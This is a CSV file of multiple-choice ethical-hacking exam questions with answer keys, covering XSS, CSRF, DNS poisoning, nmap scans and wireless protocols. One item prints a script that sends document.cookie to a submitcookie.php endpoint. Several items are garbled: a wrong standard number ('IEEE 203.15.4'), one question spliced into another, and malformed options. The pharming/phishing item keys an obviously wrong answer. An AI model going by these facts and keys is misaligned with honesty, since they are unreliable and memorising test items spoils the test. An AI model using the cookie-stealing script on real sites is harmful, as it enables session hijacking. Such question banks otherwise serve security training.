question,option_a,option_b,option_c,option_d,correct_option
"""You need to transfer sensitive data of the organization between industrial systems
securely. For these purposes, you have decided to use short-range wireless
communication technology that meets the following requirements:
- Protocol based on the IEEE 203.15.4 standard;
- Range of 10-100 m.
- Designed for small-scale projects which need wireless connection.
Which of the following protocols will meet your requirements?""",NB-IoT,LPWAN,Zigbee,MQTT,C
"""Which of the following is a vulnerability in which the malicious person forces the user's
browser to send an authenticated request to a server?""",Session hijacking,Cross-site request forgery,Cross-site scripting,Server-side request forgery,B
"""Identify the attack by description:
When performing this attack, an attacker installs a fake communication tower between
two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the
data transmission between the user and the real tower, attempting to hijack an active
session. After that, the attacker receives the user's request and can manipulate the
virtual tower traffic and redirect a victim to a malicious website.""",Jamming signal attack,aLTEr attack,KRACK attack,Wardriving,B
"""Which of the following describes ?ross-site request forgery?""",A server makes a request to another server without the user's knowledge.,"Modifying the request by the proxy server between the client and the
server.",A request sent by a malicious user from a browser to a server.,A browser makes a request to a server without the user's knowledge.,D
"""Which of the following programs is best used for analyzing packets on your wireless
network?""",Ethereal with Winpcap,Wireshark with Winpcap,Airsnort with Airpcap,Wireshark with Airpcap,D
"""According to the configuration of the DHCP server, only the last 100 IP addresses are
available for lease in subnet 10.1.4.0/23.
Which of the following IP addresses is in the range of the last 100 addresses?""","
""10.1.3.156""","
10.1.4.254",10.1.155.200,10.1.5.200,D
"""You must discover all the active devices hidden by a restrictive firewall in the IPv4 range
in a target network.
Which of the following host discovery techniques will you use?""",ARP ping scan,TCP Maimon scan,ACK flag probe scan,UDP scan,A
"""The attacker is trying to cheat one of the employees of the target organization by
initiating fake calls while posing as a legitimate employee. Also, he sent phishing emails
to steal employee's credentials and further compromise his account.
Which of the following techniques did the attacker use?""",Social engineering,Insider threat,Password reuse,Reverse engineering,A
"""Which of the following is a piece of hardware on a motherboard that generates
encryption keys and only releases a part of the key so that decrypting a disk on a new
piece of hardware is impossible?""",CPU,TPM,GPU,UEFI,B
"""You know that an attacker can create websites similar to legitimate sites in pharming
and phishing attacks.
Which of the following is the difference between them?""","Phishing attack: an attacker provides the victim with a URL that is either
misspelled or looks similar to the legitimate website's domain name.","Pharming attack: a victim is redirected to a fake website by modifying their
host configuration file or exploiting DNS vulnerabilities.",Both pharming and phishing attacks are purely technical.,Both pharming and phishing attacks are identical.,D
"""You know that an attacker can create websites similar to legitimate sites in pharming
and phishing attacks.
Which of the following is the difference between them?""Your organization's network uses the network address 192.168.1.64 with mask
255.255.255.192, and servers in your organization's network are in the addresses
192.168.1.140, 192.168.1.141 and 192.168.1.142. The attacker who wanted to find them
couldn't do it. He used the following command for the network scanning:
nmap 192.168.1.64/28 
Why couldn't the attacker find these servers?""","He needs to add the command ""ip address"" just before the IP address",He needs to change the address to 192.168.1.0 with the same mask,The network must be dawn and the nmap command and IP address are ok,"He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28
and the servers are not in that range",D
"Which of the following is the hacker's first step in conducting a DNS cache poisoning
attack on a target organization?",The hacker makes a request to the DNS resolver.,The hacker queries a nameserver using the DNS resolver.,The hacker uses TCP to poison the DNS resolver.,The hacker forges a reply from the DNS resolver.,A
"You have discovered that someone is posting strange images without comments on
your forum. You decide to check it out and discover the following code is hidden behind
those images:
1. <script>
2. document.write(""<img.src=""https://localhost/submitcookie.php? cookie ="" +
escape(document.cookie) +"""" />);
3. </script>
What does this script do?","This PHP file silently executes the code and grabs the user's session cookie
and session ID.",The code injects a new cookie into the browser.,The code redirects the user to another site.,"The code is a virus that is attempting to gather the user's username and
password.",A
"Which of the following attacks can you perform if you know that the web server handles
the ""(../)"" (character string) incorrectly and returns the file listing of a folder structure of
the server?",Cross-site scripting.,Directory traversal.,Denial of service.,SQL injection.,B
"You were instructed to check the configuration of the webserver and you found that the
server permits SSLv2 connections, and the same private key certificate is used on a
different server that allows SSLv2 connections. You understand that this vulnerability
makes the web server vulnerable to attacks as the SSLv2 server can leak key information.
Which of the following attacks can an attacker perform using this vulnerability?",Padding oracle attack,Side-channel attack,DROWN attack,DUHK attack,C
"Matthew successfully hacked the server and got root privileges. Now he wants to pivot
and stealthy transit the traffic over the network, avoiding the IDS.
Which of the following will be the best solution for Matthew?",Install Cryptcat and encrypt outgoing packets from this server.,"Use HTTP so that all traffic can be routed vis a browser, thus evading the
internal Intrusion Detection Systems.",Use Alternate Data Streams to hide the outgoing packets from this server.,Install and use Telnet to encrypt all outgoing traffic from this server.,A
Which of the following Nmap commands perform a stealth scan?,nmap -Sm,nmap -sS,nmap -sU,nmap -sT,B
"Which of the following files determines the basic configuration in an Android
application, such as broadcast receivers, services, etc.?",classes.dex,APK.info,resources.asrc,AndroidManifest.xml,D
"Jonh, a security specialist, conducts a pentest in his organization. He found information
about the emails of two employees in some public sources and is preparing a client-side
backdoor to send to the employees via email.
Which of the stages of the cyber kill chain does John perform?",Command and control,Reconnaissance,Exploitation,Weaponization,D
"Identify the attack by description:
This attack is performed at layer 7 to take down web infrastructure. During its execution,
partial HTTP requests are sent to the web infrastructure or applications and upon
receiving a partial request, the target server opens multiple connections and keeps
waiting for the requests to complete.",Slowloris attack,Phlashing,Session splicing,Desynchronization,A
